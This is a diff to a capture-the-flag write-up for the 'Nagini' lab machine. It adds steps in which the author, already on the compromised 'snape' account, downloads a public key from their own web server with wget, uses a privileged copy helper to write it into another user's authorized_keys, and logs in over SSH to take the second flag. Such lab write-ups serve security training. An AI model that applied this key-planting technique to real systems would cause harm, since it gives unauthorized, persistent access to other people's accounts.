@@ -242,7 +242,7 @@ The **su_cp** command seems to copy a file from SOURCE to DEST.
 
 Navigating in /home/hermoine, I noted that there is .ssh folder which is empty.
 
-So i thought to upload a id_rsa using a webserver to snape home file and then using the su_cp to import it into /home/hermoine/.ssh
+So i thought to upload a id_rsa using a webserver to snape home file and then using the su_cp to import it into /home/hermoine/.ssh/authorized_keys
 
 Before doing it, I forgot to catch the 1st flag :D
 
@@ -270,3 +270,53 @@ python3 -m http.server 80
 ```
 
 ![Alt text](./img/http.PNG?raw=true "LOCAL WEB SERVER")
+
+On the hacked machine, using the snape user, we use wget to download the file id_rsa.pub
+
+```bash
+snape@Nagini:~$ wget http://192.168.1.200/id_rsa.pub
+--2021-06-13 19:41:36--  http://192.168.1.200/id_rsa.pub
+Connecting to 192.168.1.200:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 566 [application/vnd.exstream-package]
+Saving to: ‘id_rsa.pub’
+
+id_rsa.pub                                100%[=====================================================================================>]     566  --.-KB/s    in 0s
+
+2021-06-13 19:41:36 (37.6 MB/s) - ‘id_rsa.pub’ saved [566/566]
+```
+
+Now we use the su_cp to copy the id_rsa.pub in /home/hermoine/.ssh/authorized_keys
+
+```bash
+snape@Nagini:~$ /home/hermoine/bin/su_cp id_rsa.pub /home/hermoine/.ssh/authorized_keys
+
+```
+
+At this stage, we can close our snape connection and connect with the user hermoine using our private key
+
+```bash
+┌──(animale㉿kali)-[~/.ssh]
+└─$ ssh -i ~/.ssh/id_rsa hermoine@quic.nagini.hogwarts
+Linux Nagini 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Jun 13 19:46:14 2021 from 192.168.1.200
+hermoine@Nagini:~$
+```
+
+**WE'RE IN!!!!!!!!!!!!**
+
+We can now get the second flag
+
+```bash
+hermoine@Nagini:~$ cat horcrux2.txt
+horcrux_{NXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXU=}
+hermoine@Nagini:~$
+
+```
